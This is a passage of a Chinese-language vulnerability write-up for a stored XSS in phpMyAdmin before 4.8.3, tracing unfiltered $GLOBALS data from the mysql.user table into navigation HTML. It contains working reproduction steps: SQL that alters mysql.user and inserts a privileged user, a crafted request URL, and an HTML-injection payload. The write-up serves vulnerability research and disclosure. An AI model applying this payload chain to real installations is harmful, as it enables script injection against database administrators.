<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpmyadmin--483-xss"><span class="csDE05BCC">Phpmyadmin &lt; 4.8.3 XSS</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">最近在审计</span><span class="cs8926E06">phpmyadmin</span><span class="cs9C1B1871">的时候发现了一个</span><span class="cs8926E06">XSS</span><span class="cs9C1B1871">漏洞，后来发现在版本大于</span><span class="cs8926E06">4.8.3</span><span class="cs9C1B1871">以后该漏洞被修复了。看了下之前公布的</span><span class="cs8926E06">CVE</span><span class="cs9C1B1871">，有个</span><span class="cs8926E06">CVE</span><span class="cs9C1B1871">和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpmyadmin &lt; 4.8.3</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在审计</span><span class="cs8926E06">phpmyadmin</span><span class="cs9C1B1871">时，我比较关注</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">全局变量，该变量存储了本次请求的信息、</span><span class="cs8926E06">phpmyadmin</span><span class="cs9C1B1871">基本设置信息和</span><span class="cs8926E06">phpmyadmin</span><span class="cs9C1B1871">配置文件信息等。先看看</span><span class="cs8926E06">/libraries/classes/Server/Privileges.php::3977</span><span class="cs9C1B1871">的以下代码。</span></p><p class="cs3A447A38"><span class="cs9FB05234">foreach ($row as $key =&gt; $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$GLOBALS[$key] = $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很明显，该处是</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">的赋值操作，而</span><span class="cs8926E06">$row</span><span class="cs9C1B1871">来自于对</span><span class="cs8926E06">mysql.user</span><span class="cs9C1B1871">表的查询结果，且</span><span class="cs8926E06">$user_host_condition</span><span class="cs9C1B1871">可控，</span><span class="cs8926E06"><br/>/libraries/classes/Server/Privileges.php::3966</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">public static function getDataForChangeOrCopyUser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$queries = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$password = null;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($_REQUEST[&#39;change_copy&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user_host_condition = &#39; WHERE `User` = &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_username&#39;]) . &quot;&#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. &#39; AND `Host` = &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_hostname&#39;]) . &quot;&#39;;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$row = $GLOBALS[&#39;dbi&#39;]-&gt;fetchSingleRow(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;SELECT * FROM `mysql`.`user` &#39; . $user_host_condition</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">既然上述代码会将</span><span class="cs8926E06">mysql.user</span><span class="cs9C1B1871">中符合条件的行的列名和值写入</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们便可通过添加</span><span class="cs8926E06">mysql.user</span><span class="cs9C1B1871">的列来往</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">中写入任意键值。清楚思路后，我们看看哪里调用了</span><span class="cs8926E06">Privileges.php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">getDataForChangeOrCopyUser</span><span class="cs9C1B1871">函数</span><span class="cs8926E06">,</span><span class="cs9C1B1871">发现在</span><span class="cs8926E06">server_privileges.php::178</span><span class="cs9C1B1871">中对该函数有调用。</span></p><p class="cs3A447A38"><span class="cs9FB05234">list($queries, $password) = Privileges::getDataForChangeOrCopyUser();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这时我们来试试向</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">中写一个</span><span class="cs8926E06">$GLOBALS[&#39;xz&#39;]=&#39;aliyun&#39;</span><span class="cs9C1B1871">。进入</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">库，执行以下</span><span class="cs8926E06">2</span><span class="cs9C1B1871">条</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句向</span><span class="cs8926E06">user</span><span class="cs9C1B1871">表添加</span><span class="cs8926E06">xz</span><span class="cs9C1B1871">字段，并插入一条数据。</span></p><p class="cs3A447A38"><span class="cs9FB05234">ALTER TABLE user ADD xz varchar(255);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">INSERT INTO `user` (`Host`, `User`, `Password`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`, `xz`) VALUES (&#39;127.0.0.1&#39;, &#39;test&#39;, &#39;*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;Y&#39;, &#39;&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;&#39;, &#39;&#39;, &#39;aliyun&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">/libraries/classes/Server/Privileges.php::3980</span><span class="cs9C1B1871">下断点</span></p><p class="cs3A447A38"><span class="cs9FB05234">$serverVersion = $GLOBALS[&#39;dbi&#39;]-&gt;getVersion();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后构造</span><span class="cs8926E06">http://127.0.0.1/phpMyAdmin-4.8.2/server_privileges.php?change_copy=aa&amp;old_username=test&amp;old_hostname=127.0.0.1&amp;mode=5 </span><span class="cs9C1B1871">参数请求，</span><span class="cs8926E06">change_copy</span><span class="cs9C1B1871">随便给个参数即可，</span><span class="cs8926E06">mode</span><span class="cs9C1B1871">必须大于</span><span class="cs8926E06">4</span><span class="cs9C1B1871">否则新添加的数据会被删除。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png<br/></span><span class="cs9C1B1871">可以看到</span><span class="cs8926E06">$GLOBALS[&#39;xz&#39;]=&#39;aliyun&#39;</span><span class="cs9C1B1871">已经成功赋值。</span></p><h3 class="cs868C439D">
			<a name="利用构造"><span class="csD6CA00D2">利用构造</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">有了可控的</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">变量后，我们需要寻找触发点。要在一次请求便触发漏洞，公共页面是首选目标。通过全局搜索</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">变量，发现在</span><span class="cs8926E06">libraries/classes/Navigation/NavigationTree.php::1272</span><span class="cs9C1B1871">的</span><span class="cs8926E06">renderDbSelect</span><span class="cs9C1B1871">函数中有使用未过滤的</span><span class="cs8926E06">$GLOBALS</span><span class="cs9C1B1871">变量。</span></p><p class="cs3A447A38"><span class="cs9FB05234">$retval .= &#39;&lt;div&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= &#39;&lt;form action=&quot;index.php&quot;&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= Url::getHiddenFields($url_params);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= &#39;&lt;select name=&quot;db&quot; class=&quot;hide&quot; id=&quot;navi_db_select&quot;&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. &#39;&lt;option value=&quot;&quot; dir=&quot;&#39; . $GLOBALS[&#39;text_dir&#39;] . &#39;&quot;&gt;&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续搜索调用</span><span class="cs8926E06">renderDbSelect</span><span class="cs9C1B1871">函数地方，发现</span><span class="cs8926E06">libraries\classes\Navigation\Navigation.php::62</span><span class="cs9C1B1871">的</span><span class="cs8926E06">getDisplay</span><span class="cs9C1B1871">函数。</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function getDisplay()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Init */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$response = Response::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $response-&gt;isAjax()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$header = new NavigationHeader();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval = $header-&gt;getDisplay();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tree = new NavigationTree();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $response-&gt;isAjax()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| ! empty($_REQUEST[&#39;full&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| ! empty($_REQUEST[&#39;reload&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($GLOBALS[&#39;cfg&#39;][&#39;ShowDatabasesNavigationAsTree&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// provide database tree in navigation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$navRender = $tree-&gt;renderState();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// provide legacy pre-4.0 navigation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$navRender = $tree-&gt;renderDbSelect();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续搜索实例化</span><span class="cs8926E06">Naviagtion</span><span class="cs9C1B1871">类并且调用了</span><span class="cs8926E06">getDisplay</span><span class="cs9C1B1871">函数的地方，发现</span><span class="cs8926E06">libraries\classes\Header.php::440</span><span class="cs9C1B1871">的</span><span class="cs8926E06">getDisplay</span><span class="cs9C1B1871">函数有调用。</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function getDisplay()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...(</span><span class="cs7FFD2630">省略</span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;_menuEnabled &amp;&amp; $GLOBALS[&#39;server&#39;] &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$nav = new Navigation();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= $nav-&gt;getDisplay();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">搜索实例化</span><span class="cs8926E06">Header-&gt;GetDisplay</span><span class="cs9C1B1871">的方法，发现</span><span class="cs8926E06">\libraries\classes\Response.php::100</span><span class="cs9C1B1871">的构造方法中实例化了</span><span class="cs8926E06">Header</span><span class="cs9C1B1871">类，而</span><span class="cs8926E06">$this-_header</span><span class="cs9C1B1871">又在</span><span class="cs8926E06">_getDisplay</span><span class="cs9C1B1871">中被调用。</span><span class="cs8926E06">_getDisplay</span><span class="cs9C1B1871">被</span><span class="cs8926E06">_htmlResponse</span><span class="cs9C1B1871">调用，</span><span class="cs8926E06">_htmlResponse</span><span class="cs9C1B1871">在</span><span class="cs8926E06">response</span><span class="cs9C1B1871">函数中被调用。</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function __construct()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! defined(&#39;TESTSUITE&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer = OutputBuffering::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer-&gt;start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;register_shutdown_function(array($this, &#39;response&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_header = new Header();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_HTML &nbsp;&nbsp;= &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_JSON &nbsp;&nbsp;= array();</span></p><p class="cs40DD2BC9"><span class="cs8926E06">\libraries\classes\Response.php::266</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function _getDisplay()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// The header may contain nothing at all,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if its content was already rendered</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// and, in this case, the header will be</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// in the content part of the request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval &nbsp;= $this-&gt;_header-&gt;getDisplay();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= $this-&gt;_HTML;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$retval .= $this-&gt;_footer-&gt;getDisplay();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $retval;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">\libraries\classes\Response.php::279</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function _htmlResponse()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo $this-&gt;_getDisplay();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">\libraries\classes\Response.php::438</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function response()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chdir($this-&gt;getCWD());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer = OutputBuffering::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (empty($this-&gt;_HTML)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_HTML = $buffer-&gt;getContents();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;isAjax()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_ajaxResponse();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_htmlResponse();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer-&gt;flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里注意</span><span class="cs8926E06">__construct</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">register_shutdown_function</span><span class="cs9C1B1871">函数，看</span><span class="cs8926E06">php manual</span><span class="cs9C1B1871">，意思是说当脚本运行结束或遇到</span><span class="cs8926E06">exit</span><span class="cs9C1B1871">后会执行该</span><span class="cs8926E06">response</span><span class="cs9C1B1871">函数，</span><span class="cs8926E06"><br/>2.png<br/></span><span class="csE3F655E4">意思就是说只要哪里实例化了</span><span class="cs5BEC2C28">Response</span><span class="csE3F655E4">类，在程序运行结束后就会执行</span><span class="cs5BEC2C28">response</span><span class="csE3F655E4">函数</span><span class="cs9C1B1871">。真好，回到</span><span class="cs8926E06">server_privileges.php::34</span><span class="cs9C1B1871">行，发现有实例化</span><span class="cs8926E06">Response</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">$response = Response::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$header &nbsp;&nbsp;= $response-&gt;getHeader();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$scripts &nbsp;= $header-&gt;getScripts();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">拥有以上调用链后，只需要控制</span><span class="cs8926E06">$GLOBAS</span><span class="cs9C1B1871">的键为</span><span class="cs8926E06">text_dir,</span><span class="cs9C1B1871">值为</span><span class="cs8926E06">XSS payload</span><span class="cs9C1B1871">即可，进入</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">库，执行以下</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句修改列名</span><span class="cs8926E06">xz</span><span class="cs9C1B1871">为</span><span class="cs8926E06">text_dir</span><span class="cs9C1B1871">，并修改数据为</span><span class="cs8926E06">XSS Payload</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">ALTER TABLE `user` CHANGE `xz` `text_dir` VARCHAR(255) CHARACTER SET utf8 COLLATE utf8_bin NULL DEFAULT NULL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">UPDATE `user` SET `text_dir` = &#39;\&quot;&gt;&lt;img src&gt;&lt;option dir=\&quot;&#39; WHERE `user`.`Host` = &#39;127.0.0.1&#39; AND `user`.`User` = &#39;test&#39;;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造</span><span 